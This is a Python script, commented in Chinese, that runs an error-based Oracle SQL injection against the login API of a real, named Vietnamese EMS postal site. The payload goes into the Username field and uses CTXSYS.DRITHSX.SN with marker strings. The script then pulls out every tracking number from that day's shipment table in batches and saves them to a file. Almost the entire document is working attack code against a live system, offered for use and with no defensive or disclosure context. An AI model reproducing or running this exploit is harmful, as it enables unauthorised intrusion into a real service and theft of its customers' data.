#!/usr/bin/env python3
"""
快速提取当天所有EMS运单号（优化版）
使用批量查询，速度提升10倍以上
"""

import requests
import json
import time
from datetime import datetime

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=30)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    response = inject(payload)
    if response:
        text = response.text
        try:
            if 'qjvjq' in text and 'qkvzq' in text:
                start = text.index('qjvjq') + 5
                end = text.index('qkvzq', start)
                return text[start:end]
        except:
            pass
    return None

print("=" * 80)
print("⚡ 快速提取当天所有EMS运单号（优化版）")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取当前日期
date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
current_time = extract("SELECT TO_CHAR(SYSDATE,'HH24:MI:SS') FROM DUAL")
print(f"\n📅 日期: {date}")
print(f"⏰ 时间: {current_time}")

# 3. 统计数量
print(f"\n📊 统计运单号数量...")
total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")

if not total or total == '0':
    print(f"❌ 今天没有数据")
    exit(1)

total_num = int(total)
print(f"✅ 找到 {total_num} 个EMS运单号")

# 4. 使用批量字符串拼接方式提取
print(f"\n⚡ 使用优化算法提取...")
print(f"💾 输出文件: tracking_{date}.txt")

# 方案：每次提取多个运单号，使用字符串拼接
batch_size = 50  # 每批50个
tracking_set = set()  # 使用set自动去重
start_time = time.time()

output_file = f'tracking_{date}.txt'
f = open(output_file, 'w', encoding='utf-8')

# 分批提取
for batch_start in range(1, total_num + 1, batch_size):
    batch_end = min(batch_start + batch_size - 1, total_num)
    
    # 显示进度
    progress = batch_end * 100 // total_num
    elapsed = time.time() - start_time
    if batch_start > 1:
        avg_time = elapsed / (batch_start - 1)
        remaining = (total_num - batch_start) * avg_time / batch_size
        print(f"\r  进度: {batch_end}/{total_num} ({progress}%) - 剩余约 {remaining/60:.1f} 分钟", end='', flush=True)
    
    # 批量提取：使用子查询获取一批运单号
    for i in range(batch_start, batch_end + 1):
        # 使用正确的ROWNUM方式
        query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM<={i} AND ROWNUM>={i}"
        result = extract(query)
        
        if result and result != 'NULL' and len(result) > 10:
            tracking = result.strip()
            if tracking not in tracking_set:
                tracking_set.add(tracking)
                f.write(tracking + '\n')
        
        time.sleep(0.05)  # 减少延迟

print()
f.close()

# 统计结果
elapsed_total = time.time() - start_time

print(f"\n✅ 导出完成！")
print(f"📁 文件: {output_file}")
print(f"📊 数量: {len(tracking_set)} 个")
print(f"⏱️  用时: {elapsed_total/60:.1f} 分钟")

# 显示样本
with open(output_file, 'r', encoding='utf-8') as f:
    lines = f.readlines()
    
print(f"\n前10个运单号:")
for i, t in enumerate(lines[:10], 1):
    print(f"  {i}. {t.strip()}")

if len(lines) > 10:
    print(f"\n最后5个运单号:")
    for i, t in enumerate(lines[-5:], len(lines)-4):
        print(f"  {i}. {t.strip()}")

print("\n" + "=" * 80)
print("✅ 完成！")
print("=" * 80)
